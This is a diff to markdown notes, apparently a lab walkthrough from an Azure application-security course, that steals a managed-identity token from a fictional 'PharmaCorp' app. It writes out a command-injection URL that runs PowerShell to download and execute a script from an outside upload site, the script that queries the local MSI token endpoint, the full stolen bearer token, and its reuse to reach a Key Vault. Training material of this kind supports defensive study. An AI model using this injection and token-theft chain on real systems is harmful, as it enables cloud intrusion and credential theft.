@@ -240,5 +240,61 @@ Account                              SubscriptionName TenantId                  
 -------                              ---------------- --------                             -----------
 3329FEA7-642E-4C09-B1AD-D8EDBE140267 PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
 ```
+Obtain resource with authenticated application:
+
+```
+PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> Get-AzResource
 
 
+Name              : compositionsecrets
+ResourceGroupName : Composition
+ResourceType      : Microsoft.KeyVault/vaults
+Location          : francecentral
+ResourceId        : /subscriptions/aac02f74-b0d2-45d2-8fbc-8d33f274116f/resourceGroups/Composition/providers/Microsoft.KeyVault/vaults/compositionsecrets
+Tags              :
+
+
+```
+
+2. The second option is us the previous upload application :
+https://contactpharmacorp.azurewebsites.net/upload
+```
+studentuser107.txt
+$headers = @{'secret' = '03B4C9B76E004F11ADA50DAC8CFE4753'}
+Invoke-RestMethod -Method GET -Uri "http://127.0.0.1:41693/MSI/token/?resource=https://management.azure.com&api-version=2017-09-01" -Headers $headers
+```
+Validate the uploaded file in:
+https://contactpharmacorp.azurewebsites.net/studentuser107.txt
+
+Finally from the target Application try to invoke the code remotely:
+
+```
+https://analytics.pharmacorphq.com/main?inputUser=powershell -c "IEX (irm 'https://contactpharmacorp.azurewebsites.net/studentuser107.txt')"&category-color=success
+```
+And obtain the token :
+```
+access_token : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9m               eG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdl               dyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjo               iaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDU               tMTg0NzAxNTRiN2NkLyIsImlhdCI6MTY5Njc4NDQxOSwibmJmIjoxNjk2Nzg0NDE               5LCJleHAiOjE2OTY4NzExMTksImFpbyI6IkUyRmdZR0RLa1AxOFh1ZE1xa2ZaeXU               4dGRkY2lBUT09IiwiYXBwaWQiOiIzMzI5ZmVhNy02NDJlLTRjMDktYjFhZC1kOGV               kYmUxNDAyNjciLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5               kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0xODQ3MDE1NGI3Y2QvIiw               iaWR0eXAiOiJhcHAiLCJvaWQiOiI3ZGY5YWU1Ny0zZWI5LTQzN2MtYTBlMi03MTQ               yODM3ODRjZGQiLCJyaCI6IjAuQVhFQXdabjU0TzZHb0VlXzFSaEhBVlMzelVaSWY               za0F1dGRQdWtQYXdmajJNQk9IQUFBLiIsInN1YiI6IjdkZjlhZTU3LTNlYjktNDM               3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInRpZCI6ImUwZjk5OWMxLTg2ZWUtNDdhMC1               iZmQ1LTE4NDcwMTU0YjdjZCIsInV0aSI6IklTdWFheVBQVFV5c1hFbE80ajQ5QUE               iLCJ2ZXIiOiIxLjAiLCJ4bXNfY2FlIjoiMSIsInhtc19taXJpZCI6Ii9zdWJzY3J               pcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXN               vdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l               0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCIsInhtc190Y2R0IjoiMTY1NTM1MzYyOCJ               9.PDuxy0ZHbTK3L1DhVI6C6MfCJow1VvF5Xjrwm2CGGbJpU89Qnr_5S2F9P1EBYN               rUmChq7FX4mRss7EsWFUbTY-jAr3ZAdGNxJo1FknBMPmDC7ZoSxV3aLZ8JBNWH4S               ZtUrh6rlBC8T2020jyPCDb4tWug6xcskRsJyORKovm2OxKsbS-0f8AkrWeqXGdVh               wQM3YjPW4Gg-Jv4JTRVRvwho2NCLkhNUYKIcVUFIIFeoPS5GLBHWjXjh7zCC1paG               8noVBaX15DAnroeS_N__LlDzmTN8geyuCyCDWvqSKufZU7zc-AtNH_zUa49eC8XF               ue94j8siuXEGk1OE6cqGcoygexpires_on   : 10/9/2023 5:05:18 PM +00:00resource     : https://management.azure.comtoken_type   : Bearerclient_id    : 3329FEA7-642E-4C09-B1AD-D8EDBE140267
+
+```
+And finalley after pared the JWT token connect to azure and obtain the resource:
+
+```
+PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> $token_2="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZTBmOTk5YzEtODZlZS00N2EwLWJmZDUtMTg0NzAxNTRiN2NkLyIsImlhdCI6MTY5Njc4NDQxOSwibmJmIjoxNjk2Nzg0NDE5LCJleHAiOjE2OTY4NzExMTksImFpbyI6IkUyRmdZR0RLa1AxOFh1ZE1xa2ZaeXU4dGRkY2lBUT09IiwiYXBwaWQiOiIzMzI5ZmVhNy02NDJlLTRjMDktYjFhZC1kOGVkYmUxNDAyNjciLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9lMGY5OTljMS04NmVlLTQ3YTAtYmZkNS0xODQ3MDE1NGI3Y2QvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI3ZGY5YWU1Ny0zZWI5LTQzN2MtYTBlMi03MTQyODM3ODRjZGQiLCJyaCI6IjAuQVhFQXdabjU0TzZHb0VlXzFSaEhBVlMzelVaSWYza0F1dGRQdWtQYXdmajJNQk9IQUFBLiIsInN1YiI6IjdkZjlhZTU3LTNlYjktNDM3Yy1hMGUyLTcxNDI4Mzc4NGNkZCIsInRpZCI6ImUwZjk5OWMxLTg2ZWUtNDdhMC1iZmQ1LTE4NDcwMTU0YjdjZCIsInV0aSI6IklTdWFheVBQVFV5c1hFbE80ajQ5QUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfY2FlIjoiMSIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2FhYzAyZjc0LWIwZDItNDVkMi04ZmJjLThkMzNmMjc0MTE2Zi9yZXNvdXJjZWdyb3Vwcy9BbmFseXRpY3MvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvYW5hbHl0aWNzcGhhcm1hY29ycCIsInhtc190Y2R0IjoiMTY1NTM1MzYyOCJ9.PDuxy0ZHbTK3L1DhVI6C6MfCJow1VvF5Xjrwm2CGGbJpU89Qnr_5S2F9P1EBYNrUmChq7FX4mRss7EsWFUbTY-jAr3ZAdGNxJo1FknBMPmDC7ZoSxV3aLZ8JBNWH4SZtUrh6rlBC8T2020jyPCDb4tWug6xcskRsJyORKovm2OxKsbS-0f8AkrWeqXGdVhwQM3YjPW4Gg-Jv4JTRVRvwho2NCLkhNUYKIcVUFIIFeoPS5GLBHWjXjh7zCC1paG8noVBaX15DAnroeS_N__LlDzmTN8geyuCyCDWvqSKufZU7zc-AtNH_zUa49eC8XFue94j8siuXEGk1OE6cqGcoyg"
+PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> Connect-AzAccount -AccessToken $token_2 -AccountId 3329FEA7-642E-4C09-B1AD-D8EDBE140267
+
+Account                              SubscriptionName TenantId                             Environment
+-------                              ---------------- --------                             -----------
+3329FEA7-642E-4C09-B1AD-D8EDBE140267 PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
+
+
+PS C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140> Get-AzResource
+
+
+Name              : compositionsecrets
+ResourceGroupName : Composition
+ResourceType      : Microsoft.KeyVault/vaults
+Location          : francecentral
+ResourceId        : /subscriptions/aac02f74-b0d2-45d2-8fbc-8d33f274116f/resourceGroups/Composition/providers/Microsoft.KeyVault/vaults/compositionsecrets
+Tags              :
+
+```
